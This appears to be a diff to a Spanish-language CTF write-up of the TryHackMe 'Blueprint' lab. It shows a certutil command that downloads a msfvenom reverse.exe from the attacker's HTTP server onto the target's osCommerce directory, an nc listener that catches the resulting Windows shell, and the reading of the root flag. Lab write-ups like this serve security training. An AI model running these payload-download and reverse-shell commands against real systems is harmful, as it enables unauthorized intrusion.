@@ -250,8 +250,8 @@ Pues siguiendo el proceso anterior creamos una reverse shell con msfvenom, segui
     ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/script]
     └─# python3 -m http.server 80 
     Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-
-       RCE_SHELL$ certutil -urlcache -f http://10.8.64.232/reverse.exe reverse.exe
+   ## 
+    RCE_SHELL$ certutil -urlcache -f http://10.8.64.232/reverse.exe reverse.exe
     ****  Online  ****
     CertUtil: -URLCache command completed successfully.
     
@@ -271,7 +271,49 @@ Pues siguiendo el proceso anterior creamos una reverse shell con msfvenom, segui
                    4 File(s)         75,401 bytes
                    3 Dir(s)  19,509,014,528 bytes free
 
+Nos ponemos en escucha en nuesto equipo y ejecutamos ls reverse shell.
 
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/script]
+    └─# nc -lnvp 1988                                                                 
+    listening on [any] 1988 ...
+    connect to [10.8.64.232] from (UNKNOWN) [10.10.111.154] 49222
+    Microsoft Windows [Version 6.1.7601]
+    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+    C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>dir
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is 14AF-C52C
+    
+     Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
+    
+    07/13/2023  03:47 PM    <DIR>          .
+    07/13/2023  03:47 PM    <DIR>          ..
+    04/11/2019  10:52 PM               447 application.php
+    07/13/2023  03:48 PM             1,118 configure.php
+    04/11/2019  10:52 PM    <DIR>          functions
+    07/13/2023  03:46 PM                34 rce.php
+    07/13/2023  03:47 PM            73,802 reverse.exe
+                   4 File(s)         75,401 bytes
+                   3 Dir(s)  19,505,434,624 bytes free
+
+![image](https://github.com/Esevka/CTF/assets/139042999/0433127a-d92d-4099-9385-b3684d1fdc77)
+
+## Flags
+
+root.txt
+
+    c:\Users\Administrator\Desktop>type root.txt.txt
+    type root.txt.txt
+    THM{flag}
+
+"Lab" user NTLM hash decrypted  
+    
+
+
+    
+
+    
     
 
     
